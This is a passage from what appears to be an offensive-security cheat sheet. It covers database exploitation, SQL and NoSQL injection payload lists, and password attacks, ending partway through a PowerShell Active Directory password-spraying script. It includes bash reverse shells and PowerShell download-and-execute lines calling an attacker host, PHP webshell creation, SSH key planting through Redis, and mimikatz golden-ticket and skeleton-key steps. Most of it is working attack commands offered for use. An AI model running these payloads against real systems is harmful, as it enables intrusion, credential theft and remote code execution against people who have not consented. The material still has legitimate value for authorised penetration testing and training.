mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

##### Update User Password

```c
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

##### Drop a Shell

```c
mysql> \! /bin/sh
```

##### Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

##### Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

#### NoSQL Injection

```c
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

#### PostgreSQL

```c
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

##### Common Commands

```c
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
```

##### Postgres Remote Code Execution

```c
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

#### Redis

```c
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

##### Enter own SSH Key

```c
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

#### SQL Injection

##### Master List

```c
';#---              // insert everywhere! Shoutout to xsudoxx!
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

##### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

#### Common Injections

##### MySQL & MariaDB

###### Get Number of Columns

```c
-1 order by 3;#
```

###### Get Version

```c
-1 union select 1,2,version();#
```

###### Get Database Name

```c
-1 union select 1,2,database();#
```

###### Get Table Name

```c
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
```

###### Get Column Name

```c
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

###### Read a File

```c
SELECT LOAD_FILE('/etc/passwd')
```

###### Dump Data

```c
-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
```

###### Create Webshell

```c
LOAD_FILE('/etc/httpd/conf/httpd.conf')
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
```

or

```c
LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

##### MSSQL

###### Authentication Bypass

```c
' or 1=1--
```

###### Get Version with Time-Based Injection

```c
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

###### Enable xp_cmdshell

```c
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

###### Remote Code Execution (RCE)

```c
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

##### Orcale SQL

###### Authentication Bypass

```c
' or 1=1--
```

###### Get Number of Columns

```c
' order by 3--
```

###### Get Table Name

```c
' union select null,table_name,null from all_tables--
```

###### Get Column Name

```c
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

###### Dump Data

```c
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

##### SQLite

###### Extracting Table Names

```c
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

###### Extracting User Table

```c
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

##### Error-based SQL Injection (SQLi)

```c
<USERNAME>' OR 1=1 -- //
```

Results in:

```c
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```c
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

##### UNION-based SQL Injection (SQLi)

###### Manual Injection Steps

```c
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

```c
' ORDER BY 1-- //
```

```c
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```c
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```c
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

```c
' UNION SELECT null, username, password, description, null FROM users -- //
```

##### Blind SQL Injection (SQLi)

```c
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

```c
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

#### SQL Truncation Attack

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

#### sqlite3

```c
sqlite3 <FILE>.db
```

```c
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

#### sqsh

```c
sqsh -S <RHOST> -U <USERNAME>
sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```

##### List Files and Folders with xp_dirtree

```c
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

### Password Attacks

## DonPAPI

```c
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
DonPAPI -local_auth <USERNAME>@<RHOST>
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

#### fcrack

```c
fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```

#### Group Policy Preferences (GPP)

##### gpp-decrypt

```c
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

#### hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```c
hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

```c
hashcat --example-hashes
hashcat --help | grep -i "ntlm"
```

```c
hashcat --identify --user <FILE>
```

```c
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

##### Custom Rules

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

###### Add a 1 to each Password

```c
echo \$1 > <FILE>.rule
```

###### Capitalize first character

```c
$1
c
```

###### Add nothing, a 1 or a ! to an existing Wordlist

```c
:
$1
$!
```

###### Rule for upper case Letter, numerical Value and special Character

- $1 > appends a "1"
- $2 > appends a "2"
- $3 > appends a "3"
- c > Capitalize the first character and lower case the rest

```c
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

###### Rule Preview

```c
hashcat -r <FILE>.rule --stdout <FILE>.txt
```

##### Cracking ASPREPRoast Password File

```c
hashcat -m 18200 -a 0 <FILE> <FILE>
```

##### Cracking Kerberoasting Password File

```c
hashcat -m 13100 --force <FILE> <FILE>
```

##### Bruteforce based on the Pattern

```c
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate Password Candidates: Wordlist + Pattern

```c
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

###### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

##### Crack with hashcat

```c
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
```

##### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

##### Cracking with OneRuleToRuleThemAll.rule

```c
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

#### Hydra

```c
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
```

```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
```

```c
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

#### John

```c
keepass2john <FILE>
ssh2john id_rsa > <FILE>
zip2john <FILE> > <FILE>
john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
john <FILE> --rules --wordlist=/PATH/TO/WORDLIST/<WORDLIST
john --show <FILE>
```

#### Kerbrute

##### User Enumeration

```c
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

##### Password Spray

```c
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

#### LaZagne

```c
laZagne.exe all
```

#### mimikatz

##### Common Commands

```c
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

##### Dump Hashes

```c
.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

##### Pass the Ticket

```c
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

##### Forging Golden Ticket

```c
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\<RHOST>\admin$
```

##### Skeleton Key

```c
privilege::debug
misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

#### NetExec

```c
netexec smb <RHOST> -u '' -p '' --shares
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
netexec ldap <RHOST> -u '' -p '' --asreproast
netexec ldap <RHOST> -u '' -p '' -M -user-desc
netexec ldap <RHOST> -u '' -p '' -M get-desc-users
netexec ldap <RHOST> -u '' -p '' -M ldap-checker
netexec ldap <RHOST> -u '' -p '' -M veeam
netexec ldap <RHOST> -u '' -p '' -M maq
netexec ldap <RHOST> -u '' -p '' -M adcs
netexec ldap <RHOST> -u '' -p '' -M zerologon
netexec ldap <RHOST> -u '' -p '' -M petitpotam
netexec ldap <RHOST> -u '' -p '' -M nopac
netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
```

#### pypykatz

```c
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

#### Spray-Passwords

##### Spray-Passwords.ps1

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
